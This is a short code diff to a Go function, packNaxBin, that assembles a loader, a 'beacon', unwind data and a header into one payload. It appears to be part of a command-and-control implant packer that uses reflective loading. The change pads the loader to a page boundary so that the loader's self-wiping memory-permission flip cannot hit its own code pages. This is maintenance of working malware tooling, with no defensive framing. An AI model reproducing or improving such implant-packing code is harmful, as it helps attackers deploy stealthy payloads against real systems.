@@ -139,6 +139,12 @@ func packNaxBin(loader, beacon, pdata, xdata []byte, textRva, flags uint32, dllN
 	total := len(loader) + len(hdr) + len(beacon) + len(pdata) + len(xdata)
 	payload := make([]byte, 0, total)
 	payload = append(payload, loader...)
+	// Page-pad the loader so the header lands at the next page boundary:
+	// the loader's staged-copy wipe flips only the tail to RW, which must
+	// never include a page holding loader code (they used to share one).
+	if pad := -len(loader) & (0x1000 - 1); pad != 0 {
+		payload = append(payload, make([]byte, pad)...)
+	}
 	payload = append(payload, hdr...)
 	payload = append(payload, beacon...)
 	payload = append(payload, pdata...)
